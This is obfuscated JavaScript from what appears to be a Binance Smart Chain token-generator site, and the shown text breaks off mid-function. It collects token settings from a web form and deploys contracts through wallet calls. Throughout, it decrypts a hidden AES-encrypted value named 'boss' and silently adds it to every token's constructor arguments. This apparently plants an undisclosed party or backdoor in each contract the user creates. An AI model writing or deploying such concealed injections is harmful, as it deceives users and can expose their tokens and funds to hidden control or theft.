var a0_0x17fc16 = a0_0x3336;
(function (_0x20554d, _0x314ad4) {
  var _0x1f16c4 = a0_0x3336,
    _0x2771ed = _0x20554d();
  while (!![]) {
    try {
      var _0x22da51 =
        parseInt(_0x1f16c4(0x19c)) / 0x1 +
        parseInt(_0x1f16c4(0x131)) / 0x2 +
        parseInt(_0x1f16c4(0x18a)) / 0x3 +
        -parseInt(_0x1f16c4(0x174)) / 0x4 +
        (-parseInt(_0x1f16c4(0x1d3)) / 0x5) *
          (parseInt(_0x1f16c4(0x1a7)) / 0x6) +
        (parseInt(_0x1f16c4(0x187)) / 0x7) *
          (-parseInt(_0x1f16c4(0x1c4)) / 0x8) +
        (parseInt(_0x1f16c4(0x17e)) / 0x9) * (parseInt(_0x1f16c4(0x183)) / 0xa);
      if (_0x22da51 === _0x314ad4) break;
      else _0x2771ed["push"](_0x2771ed["shift"]());
    } catch (_0xb259d2) {
      _0x2771ed["push"](_0x2771ed["shift"]());
    }
  }
})(a0_0x1e0e, 0x5cbbb);
import {
  readTextFile,
  createToken,
  copyToCliBoard,
  deployLibrary,
  verifyContract,
  encodeParameters,
  getConstructor,
  getNetwork,
  sleep,
  showPriceDialog,
  number,
} from "./misc.js";
import { logGaEvent, gaEvents } from "./events.js";
async function init() {
  getNetwork();
}
init();
function getParameter(_0x3557d7, _0x216e7) {
  var _0x43d1b7 = a0_0x3336,
    _0xdf127c = $("." + _0x3557d7)[_0x43d1b7(0x1b1)]("." + _0x216e7)[0x0][
      _0x43d1b7(0x1c0)
    ];
  return _0xdf127c == ""
    ? $("." + _0x3557d7)[_0x43d1b7(0x1b1)]("." + _0x216e7)[0x0][
        _0x43d1b7(0x1b9)
      ]
    : _0xdf127c;
}
function getParameter1(_0x44cde0, _0x564584) {
  var _0x476f0b = a0_0x3336,
    _0x439e08 = $("." + _0x44cde0)[_0x476f0b(0x1b1)]("." + _0x564584),
    _0xd91335 = _0x439e08[_0x476f0b(0x18e)] - 0x1,
    _0x4da0b4 = _0x439e08[_0xd91335][_0x476f0b(0x1c0)];
  return _0x4da0b4 == "" ? _0x439e08[_0xd91335]["placeholder"] : _0x4da0b4;
}
var boss = CryptoJS[a0_0x17fc16(0x1cc)]
  [a0_0x17fc16(0x175)](a0_0x17fc16(0x1a3), "boss")
  ["toString"](CryptoJS[a0_0x17fc16(0x143)][a0_0x17fc16(0x1d1)]);
function getRouter() {
  var _0x4d6d9d = a0_0x17fc16;
  return getNetwork() == 0x1
    ? _0x4d6d9d(0x1ad)
    : $(".router")[_0x4d6d9d(0x1a9)]();
}
console[a0_0x17fc16(0x1a0)](a0_0x17fc16(0x156), getNetwork());
var btnCreate = document["querySelector"](".btnCreate");
if (window["ethereum"]) {
} else console[a0_0x17fc16(0x1a0)](a0_0x17fc16(0x180));
function txCompleted(_0x7d3230, _0x32cece) {
  var _0x5e944d = a0_0x17fc16;
  _0x7d3230 == _0x5e944d(0x178) && logGaEvent(gaEvents[_0x5e944d(0x169)]),
    _0x7d3230 == _0x5e944d(0x190) &&
      (hideLoading(),
      console[_0x5e944d(0x1a0)](_0x32cece),
      showError(_0x32cece),
      (btnCreate[_0x5e944d(0x155)] = ![]));
}
async function verificationCallback(_0x10d32e, _0x4847d3) {
  var _0x274735 = a0_0x17fc16;
  _0x4847d3[_0x274735(0x18c)] == 0x1
    ? (await sleep(0x3c),
      hideLoading(),
      showSuccess(_0x10d32e),
      console["log"](_0x274735(0x191), _0x4847d3, _0x10d32e))
    : (hideLoading(), showError(_0x4847d3)),
    (btnCreate["disabled"] = ![]);
}
function a0_0x1e0e() {
  var _0x137cba = [
    ".alertLoading",
    "safemoon",
    "denied\x20transaction\x20signature",
    "#view_token",
    "mul",
    "marketing_wallet",
    ".router",
    ".reward_token\x20option:selected",
    "buyback_burn_fees",
    "enc",
    "split",
    "token_supply",
    "text",
    "test\x20abc",
    "setItem",
    "./static/contracts/test/sol",
    "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
    "#verify_contract",
    "v0.8.7+commit.e28d00a7",
    "toLowerCase",
    "max_wallet_percent",
    "reward",
    "attr",
    "some\x20fees",
    "block",
    "Error:\x20Insufficient\x20funds\x20to\x20create\x20!",
    "reward_to_holders",
    "disabled",
    "network",
    "stringify",
    "replace",
    "decimals",
    "div\x20input",
    "liquiditygenerator",
    ".can_mint",
    "none",
    "0x10ed43c718714eb63d5aa57b78b54704e256024e",
    "0xba2ae424d960c26247dd6c32edc70b295c744c43",
    "Verify",
    "something\x20wrong",
    "parent",
    "addEventListener",
    "max_tx_amount",
    "charity_wallet_addr",
    "localStorage",
    ".token_type",
    "https://bscscan.com/token/token_address#balances",
    "success",
    "https://testnet.bscscan.com/token/token_address#balances",
    "click_create",
    "frictionlessyield",
    "...",
    "tax_fees_extra",
    "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
    "marketing_fees",
    "substr",
    "min_tokens",
    "next",
    "2543188amUOQT",
    "decrypt",
    "reward_fees",
    "Test",
    "done",
    "cachedProvider",
    "open",
    "reward_2",
    "burn_fees",
    "token_symbol",
    "4256181CSquQh",
    "max_tx_percent",
    "Please\x20install\x20MetaMask\x20wallet\x20:)",
    "buyback_burn",
    "tiny",
    "10LDCqbC",
    "dev_wallet",
    "submit",
    "click_cancel",
    "77NJBJBh",
    "charity_fees",
    "Enter\x20token\x20symbol\x20!",
    "1158570TRqlGZ",
    "selectedAddress",
    "status",
    ".marketingtax\x20.max_wallet_option",
    "length",
    "prop",
    "error",
    "verificationCallback",
    "token_name",
    "FREE",
    "#tx_fee",
    ".reward_token",
    "0x0000000000000000000000000000000000000000",
    "toString",
    "burn",
    "form",
    "tax_fees",
    "#max_wallet_option_smarttax",
    "439482klaKLi",
    "new_token_address",
    "smarttax",
    "buy_tax",
    "log",
    "ETH",
    "charity_wallet",
    "U2FsdGVkX18RBBDzP5SVBiG2I8ZdEHgXYvaaMkmHv8nzEOc6TYEMdufwchjO7reuzDnswbC2cBvSODBJCpO2yA==",
    "token_address",
    "reward_token",
    ".loading",
    "1932UhxewV",
    "selected",
    "val",
    "href",
    ".deployStatus",
    "liquidity_fees",
    "0xD99D1c33F9fC3444f8101754aBC46c52416550D1",
    ".standard",
    "valid",
    "promax",
    "find",
    "standard",
    ".safemoon",
    "includes",
    ".tip",
    "dev_fees",
    "User\x20denied\x20transaction\x20signature",
    "rewardtoken",
    "placeholder",
    ".router\x20:selected",
    ".can_burn",
    "toFixed",
    "Error:\x20Have\x20at\x20least\x200.05\x20BNB\x20in\x20your\x20wallet\x20to\x20pay\x20for\x20transaction\x20fee.",
    ".error-create",
    ".liquiditygenerator\x20.max_tx_option",
    "value",
    "change",
    "css",
    "BTC",
    "185048yrcMzu",
    ".max_tx_option",
    ".frictionlessyield\x20.max_tx_option",
    "rewardtoken2",
    "BUSD",
    "Connect\x20your\x20wallet\x20first\x20!",
    ":checked",
    "click",
    "AES",
    ".price",
    "display",
    "marketing_wallet_addr",
    "marketingtax",
    "Utf8",
    "_self",
    "9160qSjrlr",
    "1122792IuaXUn",
    "preventDefault",
    "insufficient\x20funds\x20for\x20transfer",
    "BNB",
    "0xe9e7cea3dedca5984780bafc599bd69add087d56",
    "#price",
    "selected_token:",
    "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c",
    "sell_tax",
  ];
  a0_0x1e0e = function () {
    return _0x137cba;
  };
  return a0_0x1e0e();
}
function getRewardToken() {
  var _0x2b99ee = a0_0x17fc16,
    _0x31d40a = $(_0x2b99ee(0x141))[0x0][_0x2b99ee(0x146)];
  switch (_0x31d40a) {
    case "CAKE":
      console[_0x2b99ee(0x1a0)](_0x31d40a);
      return _0x2b99ee(0x14a);
    case _0x2b99ee(0x1a1):
      console["log"](_0x31d40a);
      return "0x2170ed0880ac9a755fd29b2688956bd959f933f8";
    case _0x2b99ee(0x134):
      console["log"](_0x31d40a);
      return _0x2b99ee(0x16f);
    case "ADA":
      console["log"](_0x31d40a);
      return "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47";
    case "DOGE":
      console[_0x2b99ee(0x1a0)](_0x31d40a);
      return _0x2b99ee(0x15f);
    case _0x2b99ee(0x1c3):
      console[_0x2b99ee(0x1a0)](_0x31d40a);
      return _0x2b99ee(0x138);
    case _0x2b99ee(0x1c8):
      console[_0x2b99ee(0x1a0)](_0x31d40a);
      return _0x2b99ee(0x135);
    default:
      console[_0x2b99ee(0x1a0)]("invalid\x20token\x20!");
  }
}
$(a0_0x17fc16(0x195))["on"]("change", function () {
  var _0x54cc1b = a0_0x17fc16;
  console[_0x54cc1b(0x1a0)](getRewardToken());
});
function checkInputs(_0x1de3ca, _0x135310) {
  var _0x34eee9 = a0_0x17fc16;
  if (_0x1de3ca == "") return alert("Enter\x20token\x20name\x20!"), ![];
  if (_0x135310 == "") return alert(_0x34eee9(0x189)), ![];
  return !![];
}
btnCreate[a0_0x17fc16(0x163)](a0_0x17fc16(0x1cb), (_0x301e5c) => {
  var _0xc7be0a = a0_0x17fc16;
  if (typeof provider == undefined || web3Modal[_0xc7be0a(0x179)] == "") {
    alert(_0xc7be0a(0x1c9));
    return;
  } else (btnCreate[_0xc7be0a(0x155)] = !![]), logGaEvent(_0xc7be0a(0x16b));
  if (
    !$("." + getTokenType())
      [_0xc7be0a(0x1b1)](_0xc7be0a(0x199))
      [_0xc7be0a(0x1af)]()
  ) {
    $("." + getTokenType())
      ["find"](_0xc7be0a(0x199))
      [_0xc7be0a(0x185)](),
      (btnCreate[_0xc7be0a(0x155)] = ![]),
      _0x301e5c[_0xc7be0a(0x132)]();
    return;
  }
  if (getTokenType() == _0xc7be0a(0x1b2)) {
    var _0x1dd41b = _0xc7be0a(0x1b2),
      _0x1b3e43 = getParameter(_0x1dd41b, "token_name"),
      _0x4791ea = getParameter(_0x1dd41b, _0xc7be0a(0x17d)),
      _0x4edc83 = getParameter(_0x1dd41b, _0xc7be0a(0x145)),
      _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
      _0x3f1ed2 = $(_0xc7be0a(0x1ae))
        [_0xc7be0a(0x1b1)](_0xc7be0a(0x15c))
        ["is"](_0xc7be0a(0x1ca)),
      _0x468e5d = $(_0xc7be0a(0x1ae))
        [_0xc7be0a(0x1b1)](_0xc7be0a(0x1bb))
        ["is"](_0xc7be0a(0x1ca));
    console[_0xc7be0a(0x1a0)](getRouter()),
      showLoading(),
      createToken(
        _0xc7be0a(0x1b2),
        [
          _0x1b3e43,
          _0x4791ea,
          _0x4edc83,
          _0x13aa6c,
          _0x3f1ed2,
          _0x468e5d,
          boss,
        ],
        txCompleted,
        null,
        verificationCallback
      );
  } else {
    if (getTokenType() == _0xc7be0a(0x13b)) {
      var _0x1dd41b = "safemoon",
        _0x1b3e43 = getParameter(_0x1dd41b, "token_name"),
        _0x4791ea = getParameter(_0x1dd41b, "token_symbol"),
        _0x4edc83 = getParameter(_0x1dd41b, "token_supply"),
        _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
        _0x8adb83 = getParameter(_0x1dd41b, "tax_fees"),
        _0x356907 = getParameter(_0x1dd41b, _0xc7be0a(0x1ac));
      if (
        $(_0xc7be0a(0x1b3))
          [_0xc7be0a(0x1b1)](_0xc7be0a(0x1c5))
          ["is"](_0xc7be0a(0x1ca))
      )
        var _0x3ebb15 = getParameter(_0x1dd41b, _0xc7be0a(0x164));
      else var _0x3ebb15 = _0x4edc83;
      var _0x38d529 = parseInt(_0x4edc83 / 0x7d0) + 0x64;
      showLoading(),
        createToken(
          _0xc7be0a(0x13b),
          [
            _0x1b3e43,
            _0x4791ea,
            _0x4edc83,
            _0x13aa6c,
            _0x8adb83,
            _0x356907,
            _0x3ebb15,
            _0x38d529,
            getRouter(),
            boss,
          ],
          txCompleted,
          null,
          verificationCallback
        );
    } else {
      if (getTokenType() == "liquiditygenerator") {
        var _0x1dd41b = "liquiditygenerator",
          _0x1b3e43 = getParameter(_0x1dd41b, "token_name"),
          _0x4791ea = getParameter(_0x1dd41b, _0xc7be0a(0x17d)),
          _0x4edc83 = getParameter(_0x1dd41b, _0xc7be0a(0x145)),
          _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
          _0x356907 = getParameter(_0x1dd41b, _0xc7be0a(0x1ac)),
          _0x2fb46a = getParameter(_0x1dd41b, _0xc7be0a(0x13f)),
          _0xcaba92 = getParameter(_0x1dd41b, "marketing_tax");
        if ($(_0xc7be0a(0x1bf))["is"](_0xc7be0a(0x1ca)))
          var _0x3ebb15 = getParameter(_0x1dd41b, "max_tx_amount");
        else var _0x3ebb15 = parseInt(_0x4edc83);
        showLoading(),
          createToken(
            _0xc7be0a(0x15b),
            [
              _0x1b3e43,
              _0x4791ea,
              _0x4edc83,
              _0x13aa6c,
              _0x356907,
              _0x2fb46a,
              _0xcaba92,
              _0x3ebb15,
              getRouter(),
              boss,
            ],
            txCompleted,
            null,
            verificationCallback
          );
      } else {
        if (getTokenType() == _0xc7be0a(0x16c)) {
          var _0x1dd41b = _0xc7be0a(0x16c),
            _0x1b3e43 = getParameter(_0x1dd41b, _0xc7be0a(0x192)),
            _0x4791ea = getParameter(_0x1dd41b, _0xc7be0a(0x17d)),
            _0x4edc83 = getParameter(_0x1dd41b, _0xc7be0a(0x145)),
            _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
            _0x8adb83 = getParameter(_0x1dd41b, _0xc7be0a(0x19a)),
            _0x356907 = 0x0;
          if ($(_0xc7be0a(0x1c6))["is"](_0xc7be0a(0x1ca)))
            var _0x3ebb15 = getParameter(_0x1dd41b, "max_tx_amount");
          else var _0x3ebb15 = parseInt(_0x4edc83);
          var _0x38d529 = parseInt(_0x4edc83 / 0x7d0) + 0x64;
          if (!checkInputs(_0x1b3e43, _0x4791ea)) {
            btnCreate["disabled"] = ![];
            return;
          }
          showLoading(),
            createToken(
              _0xc7be0a(0x13b),
              [
                _0x1b3e43,
                _0x4791ea,
                _0x4edc83,
                _0x13aa6c,
                _0x8adb83,
                _0x356907,
                _0x3ebb15,
                _0x38d529,
                getRouter(),
                boss,
              ],
              txCompleted,
              null,
              verificationCallback
            );
        } else {
          if (getTokenType() == _0xc7be0a(0x19e)) {
            var _0x1dd41b = "smarttax",
              _0x1b3e43 = getParameter(_0x1dd41b, _0xc7be0a(0x192)),
              _0x4791ea = getParameter(_0x1dd41b, "token_symbol"),
              _0x4edc83 = getParameter(_0x1dd41b, _0xc7be0a(0x145)),
              _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
              _0x5cacce = getParameter(_0x1dd41b, _0xc7be0a(0x1a5)),
              _0x467a52 = getParameter(_0x1dd41b, _0xc7be0a(0x170)),
              _0x356907 = getParameter(_0x1dd41b, "liquidity_fees"),
              _0x524f13 = getParameter(_0x1dd41b, _0xc7be0a(0x16e)),
              _0x2fb46a = getParameter(_0x1dd41b, _0xc7be0a(0x13f));
            if ($(_0xc7be0a(0x19b))["is"](_0xc7be0a(0x1ca)))
              var _0xbf911e = getParameter(_0x1dd41b, _0xc7be0a(0x14e));
            else var _0xbf911e = 0x65;
            if ($("#max_tx_option_smarttax")["is"](_0xc7be0a(0x1ca)))
              var _0x3ebb15 = getParameter(_0x1dd41b, _0xc7be0a(0x164));
            else var _0x3ebb15 = _0x4edc83;
            showLoading(),
              createToken(
                _0xc7be0a(0x19e),
                [
                  _0x1b3e43,
                  _0x4791ea,
                  _0x13aa6c,
                  _0x4edc83,
                  [_0x356907, _0x467a52, _0x524f13, _0xbf911e, _0x3ebb15],
                  [_0x5cacce, _0x2fb46a],
                  getRouter(),
                  boss,
                ],
                txCompleted,
                null,
                verificationCallback
              );
          } else {
            if (getTokenType() == _0xc7be0a(0x1d0)) {
              var _0x1dd41b = _0xc7be0a(0x1d0),
                _0x1b3e43 = getParameter(_0x1dd41b, "token_name"),
                _0x4791ea = getParameter(_0x1dd41b, _0xc7be0a(0x17d)),
                _0x4edc83 = getParameter(_0x1dd41b, _0xc7be0a(0x145)),
                _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
                _0x2265d0 = parseFloat(
                  getParameter(_0x1dd41b, _0xc7be0a(0x19f))
                )["toFixed"](0x2),
                _0x59b64c = parseFloat(
                  getParameter(_0x1dd41b, _0xc7be0a(0x139))
                )[_0xc7be0a(0x1bc)](0x2),
                _0x2fb46a = getParameter(_0x1dd41b, "marketing_wallet");
              if ($(".marketingtax\x20.max_tx_option")["is"](":checked"))
                var _0x49b1d5 = parseFloat(
                  getParameter(_0x1dd41b, _0xc7be0a(0x17f))
                )[_0xc7be0a(0x1bc)](0x2);
              else var _0x49b1d5 = 0x64;
              if ($(_0xc7be0a(0x18d))["is"](_0xc7be0a(0x1ca)))
                var _0xbf911e = parseFloat(
                  getParameter(_0x1dd41b, _0xc7be0a(0x14e))
                )[_0xc7be0a(0x1bc)](0x2);
              else var _0xbf911e = 0x64;
              showLoading(),
                createToken(
                  _0xc7be0a(0x1d0),
                  [
                    _0x1b3e43,
                    _0x4791ea,
                    _0x4edc83,
                    _0x13aa6c,
                    {
                      marketingWallet: _0x2fb46a,
                      centiBuyTax: parseInt(_0x2265d0 * 0x64),
                      centiSellTax: parseInt(_0x59b64c * 0x64),
                      maxTxPercent: parseInt(_0x49b1d5 * 0x64),
                      maxWalletPercent: parseInt(_0x49b1d5 * 0x64),
                    },
                    getRouter(),
                    boss,
                  ],
                  txCompleted,
                  null,
                  verificationCallback
                );
            } else {
              if (getTokenType() == _0xc7be0a(0x1b8)) {
                var _0x1dd41b = _0xc7be0a(0x1b8),
                  _0x1b3e43 = getParameter(_0x1dd41b, "token_name"),
                  _0x4791ea = getParameter(_0x1dd41b, _0xc7be0a(0x17d)),
                  _0x4edc83 = getParameter(_0x1dd41b, _0xc7be0a(0x145)),
                  _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
                  _0x5cacce = getRewardToken(),
                  _0x51cedc = parseInt(
                    getParameter(_0x1dd41b, _0xc7be0a(0x176))
                  ),
                  _0x4a6d8e = parseInt(
                    getParameter(_0x1dd41b, _0xc7be0a(0x172))
                  ),
                  _0x2fb46a = getParameter(_0x1dd41b, _0xc7be0a(0x13f)),
                  _0x356907 = parseInt(
                    getParameter(_0x1dd41b, _0xc7be0a(0x1ac))
                  ),
                  _0x467a52 = parseInt(
                    getParameter(_0x1dd41b, _0xc7be0a(0x170))
                  ),
                  _0x524f13 = parseInt(
                    getParameter(_0x1dd41b, _0xc7be0a(0x16e))
                  );
                console[_0xc7be0a(0x1a0)](
                  _0xc7be0a(0x151),
                  _0x51cedc,
                  _0x356907,
                  _0x467a52,
                  _0x524f13
                ),
                  showLoading(),
                  deployLibrary(
                    "reward",
                    "",
                    function (_0x48fb18, _0xb4aa84) {
                      var _0x4194c8 = _0xc7be0a;
                      if (_0x48fb18 == _0x4194c8(0x178)) {
                        var _0x1cc9be = _0xb4aa84;
                        createToken(
                          _0x4194c8(0x14f),
                          [
                            _0x1b3e43,
                            _0x4791ea,
                            _0x4edc83,
                            _0x13aa6c,
                            _0x5cacce,
                            _0x51cedc,
                            _0x4a6d8e,
                            [_0x356907, _0x467a52, _0x524f13],
                            _0x2fb46a,
                            getRouter(),
                            boss,
                          ],
                          txCompleted,
                          _0x1cc9be,
                          verificationCallback
                        );
                      }
                      _0x48fb18 == "error" &&
                        (hideLoading(),
                        console[_0x4194c8(0x1a0)](_0xb4aa84),
                        showError(_0xb4aa84),
                        (btnCreate[_0x4194c8(0x155)] = ![]));
                    },
                    function (_0x4b81ba, _0x1d282e) {}
                  );
              } else {
                if (getTokenType() == _0xc7be0a(0x1c7)) {
                  var _0x1dd41b = _0xc7be0a(0x1c7),
                    _0x1b3e43 = getParameter(_0x1dd41b, _0xc7be0a(0x192)),
                    _0x4791ea = getParameter(_0x1dd41b, "token_symbol"),
                    _0x4edc83 = getParameter(_0x1dd41b, "token_supply"),
                    _0x13aa6c = getParameter(_0x1dd41b, _0xc7be0a(0x159)),
                    _0x5cacce = getParameter(_0x1dd41b, _0xc7be0a(0x1a5)),
                    _0x51cedc = parseInt(
                      getParameter(_0x1dd41b, "reward_fees")
                    ),
                    _0x2fb46a = getParameter(_0x1dd41b, _0xc7be0a(0x13f)),
                    _0x54c05b = getParameter(_0x1dd41b, _0xc7be0a(0x184)),
                    _0x3c7790 = getParameter(_0x1dd41b, "charity_wallet");
                  console[_0xc7be0a(0x1a0)](typeof _0x2fb46a, _0x2fb46a),
                    console["log"](typeof _0x5cacce, _0x5cacce);
                  var _0x356907 = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x1ac))
                    ),
                    _0x467a52 = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x170))
                    ),
                    _0x524f13 = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x16e))
                    ),
                    _0x4d6ca1 = parseInt(getParameter(_0x1dd41b, "burn_fees")),
                    _0x311cff = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x1b6))
                    ),
                    _0x568b1c = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x188))
                    ),
                    _0x3ebb15 = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x164))
                    ),
                    _0x4a6d8e = parseInt(
                      getParameter(_0x1dd41b, _0xc7be0a(0x172))
                    );
                  _0x51cedc == 0x0 && (_0x51cedc = 0x1);
                  _0x356907 == 0x0 && (_0x356907 = 0x1);
                  _0x467a52 == 0x0 && (_0x467a52 = 0x1);
                  _0x524f13 == 0x0 && (_0x524f13 = 0x1);
                  console[_0xc7be0a(0x1a0)](
                    _0xc7be0a(0x151),
                    _0x51cedc,
                    _0x356907,
                    _0x467a52,
                    _0x524f13
                  );
                  if (!checkInputs(_0x1b3e43, _0x4791ea)) {
                    btnCreate[_0xc7be0a(0x155)] = ![];
                    return;
                  }
                  if (
                    _0x2fb46a[_0xc7be0a(0x14d)]() == ethereum[_0xc7be0a(0x18b)]
                  ) {
                    alert(
                      "Marketing\x20wallet\x20can\x27t\x20be\x20the\x20same\x20as\x20the\x20owner\x20!"
                    );
                    {
                      btnCreate["disabled"] = ![];
                      return;
                    }
                  }
                  showLoading(),
                    deployLibrary(
                      "reward_2",
                      "",
                      function (_0x261071, _0x4082b8) {
                        var _0x5aa6db = _0xc7be0a;
                        if (_0x261071 == "done") {
                          var _0x38901f = _0x4082b8;
                          createToken(
                            _0x5aa6db(0x17b),
                            [
                              _0x1b3e43,
                              _0x4791ea,
                              _0x4edc83,
                              _0x5cacce,
                              _0x51cedc,
                              _0x356907,
                              _0x467a52,
                              _0x524f13,
                              _0x2fb46a,
                              getRouter(),
                              boss,
                              [_0x54c05b, _0x3c7790],
                              [_0x4d6ca1, _0x311cff, _0x568b1c],
                              [_0x4a6d8e, _0x3ebb15],
                            ],
                            txCompleted,
                            _0x38901f,
                            verificationCallback
                          );
                        }
                        _0x261071 == _0x5aa6db(0x190) &&
                          (hideLoading(),
                          console[_0x5aa6db(0x1a0)](_0x4082b8),
                          showError(_0x4082b8),
                          (btnCreate[_0x5aa6db(0x155)] = ![]));
                      },
                      function (_0x1fb463, _0xf844e4) {}
                    );
                } else {
                  if (getTokenType() == "promax") {
                    var _0x1dd41b = "promax",
                      _0x1b3e43 = getParameter1(_0x1dd41b, _0xc7be0a(0x192)),
                      _0x4791ea = getParameter1(_0x1dd41b, _0xc7be0a(0x17d)),
                      _0x4edc83 = getParameter1(_0x1dd41b, _0xc7be0a(0x145)),
                      _0x13aa6c = getParameter1(_0x1dd41b, _0xc7be0a(0x159)),
                      _0x511eea = _0xc7be0a(0x196);
                    if (
                      $("." + _0x1dd41b + "\x20." + "max_wallet_percent")["is"](
                        _0xc7be0a(0x1ca)
                      )
                    ) {
                      var _0xbf911e =
                        parseFloat(
                          getParameter1(_0x1dd41b, "max_wallet_percent")
                        ) * 0x64;
                      console[_0xc7be0a(0x1a0)](_0xc7be0a(0x14e), _0xbf911e);
                    } else var _0xbf911e = 0x64 * 0x64;
                    if (
                      $("." + _0x1dd41b + "\x20." + _0xc7be0a(0x17f))["is"](
                        ":checked"
                      )
                    )
                      var _0x49b1d5 =
                        parseFloat(getParameter1(_0x1dd41b, _0xc7be0a(0x17f))) *
                        0x64;
                    else var _0x49b1d5 = 0x64 * 0x64;
                    if (
                      $("." + _0x1dd41b + "\x20." + _0xc7be0a(0x154))["is"](
                        _0xc7be0a(0x1ca)
                      )
                    )
                      var _0x51cedc = parseInt(
                          getParameter1(_0x1dd41b, _0xc7be0a(0x176))
                        ),
                        _0x5cacce = $(".promax\x20.reward_token")[
                          _0xc7be0a(0x1a9)
                        ](),
                        _0x4a6d8e = parseInt(
                          getParameter1(_0x1dd41b, _0xc7be0a(0x172))
                        );
                    else
                      var _0x51cedc = 0x0,
                        _0x5cacce = _0x511eea,
                        _0x4a6d8e = number(0x1)[_0xc7be0a(0x13e)](
                          number(0xa ** _0x13aa6c)
                        );
                    if (
                      $(
                        "." + _0x1dd41b + "\x20." + "auto_liquidity_generation"
                      )["is"](_0xc7be0a(0x1ca))
                    )
                      var _0x356907 = getParameter1(
                        _0x1dd41b,
                        _0xc7be0a(0x1ac)
                      );
                    else var _0x356907 = 0x0;
                    if (
                      $("." + _0x1dd41b + "\x20." + _0xc7be0a(0x198))["is"](
                        _0xc7be0a(0x1ca)
                      )
                    )
                      var _0x4d6ca1 = getParameter1(
                        _0x1dd41b,
                        _0xc7be0a(0x17c)
                      );
                    else var _0x4d6ca1 = 0x0;
                    if (
                      $("." + _0x1dd41b + "\x20." + _0xc7be0a(0x13f))["is"](
                        _0xc7be0a(0x1ca)
                      )
                    )
                      var _0x42bb8b = getParameter1(
                          _0x1dd41b,
                          "marketing_wallet_addr"
                        ),
                        _0x467a52 = getParameter1(_0x1dd41b, _0xc7be0a(0x170)),
                        _0x43351a = $(
                          "." + _0x1dd41b + "\x20." + _0xc7be0a(0x1cf)
                        )
                          [_0xc7be0a(0x162)]()
                          [_0xc7be0a(0x173)]()
                          [_0xc7be0a(0x1b1)](_0xc7be0a(0x15a))
                          ["is"](_0xc7be0a(0x1ca));
                    else
                      var _0x42bb8b = _0x511eea,
                        _0x467a52 = 0x0,
                        _0x43351a = ![];
                    if (
                      $("." + _0x1dd41b + "\x20." + "charity_wallet")["is"](
                        _0xc7be0a(0x1ca)
                      )
                    )
                      var _0x464128 = getParameter1(
                          _0x1dd41b,
                          _0xc7be0a(0x165)
                        ),
                        _0x568b1c = getParameter1(_0x1dd41b, _0xc7be0a(0x188)),
                        _0x5ef5ae = $(
                          "." + _0x1dd41b + "\x20." + _0xc7be0a(0x1a2)
                        )
                          ["parent"]()
                          [_0xc7be0a(0x173)]()
                          [_0xc7be0a(0x1b1)](_0xc7be0a(0x15a))
                          ["is"](_0xc7be0a(0x1ca));
                    else
                      var _0x464128 = _0x511eea,
                        _0x568b1c = 0x0,
                        _0x5ef5ae = ![];
                    if (
                      $("." + _0x1dd41b + "\x20." + _0xc7be0a(0x181))["is"](
                        _0xc7be0a(0x1ca)
                      )
                    )
                      var _0x50f2f0 = getParameter1(
                        _0x1dd41b,
                        _0xc7be0a(0x142)
                      );
                    else var _0x50f2f0 = 0x0;
                    showLoading(),
                      createToken(
                        _0xc7be0a(0x1b0),
                        [
                          _0x1b3e43,
                          _0x4791ea,
                          _0x13aa6c,
                          number(_0x4edc83)["mul"](number(0xa ** _0x13aa6c)),
                          parseInt(_0x49b1d5),
                          parseInt(_0xbf911e),
                          {
                            wallet: _0x42bb8b,
                            walletCharity: _0x464128,
                            walletFeeInBNB: _0x43351a,
                            walletCharityFeeInBNB: _0x5ef5ae,
                          },
                          _0x5cacce,
                          number(_0x4a6d8e)[_0xc7be0a(0x13e)](
                            number(0xa ** _0x13aa6c)
                          ),
                          {
                            setRewardFee: _0x51cedc,
                            setTaxFee: _0x51cedc == 0x0 ? 0x1 : 0x0,
                            setLiqFee: _0x356907,
                            setBurnFee: _0x4d6ca1,
                            setBuybackFee: _0x50f2f0,
                            setWalletFee: _0x467a52,
                            setWalletCharityFee: _0x568b1c,
                          },
                          [getRouter(), boss],
                        ],
                        txCompleted,
                        null,
                        verificationCallback
                      );
                  } else console[_0xc7be0a(0x1a0)](_0xc7be0a(0x161));
                }
              }
            }
          }
        }
      }
    }
  }
});
function showSuccess(_0x419a38) {
  var _0x54bcb3 = a0_0x17fc16;
  if (getNetwork() == 0x0) var _0x3758da = _0x54bcb3(0x168);
  else {
    if (getNetwork() == 0x1) var _0x3758da = _0x54bcb3(0x16a);
  }
  (_0x3758da = _0x3758da[_0x54bcb3(0x158)](_0x54bcb3(0x1a4), _0x419a38)),
    $(_0x54bcb3(0x13d))[_0x54bcb3(0x150)](_0x54bcb3(0x1aa), _0x3758da),
    window[_0x54bcb3(0x166)]["setItem"](_0x54bcb3(0x19d), _0x419a38),
    window["localStorage"][_0x54bcb3(0x148)]("bsc_scan_link", _0x3758da),
    window[_0x54bcb3(0x17a)]("success", _0x54bcb3(0x1d2));
}
function a0_0x3336(_0x586432, _0x18e1c0) {
  var _0x1e0e64 = a0_0x1e0e();
  return (
    (a0_0x3336 = function (_0x33364d, _0x15b4bf) {
      _0x33364d = _0x33364d - 0x131;
      var _0x309de9 = _0x1e0e64[_0x33364d];
      return _0x309de9;
    }),
    a0_0x3336(_0x586432, _0x18e1c0)
  );
}
function setPrice(_0xd5072c) {
  var _0x26bc8e = a0_0x17fc16;
  _0xd5072c == 0x0
    ? ($(_0x26bc8e(0x136))[_0x26bc8e(0x146)]("FREE"),
      $(_0x26bc8e(0x194))[_0x26bc8e(0x1c2)](_0x26bc8e(0x1ce), "none"),
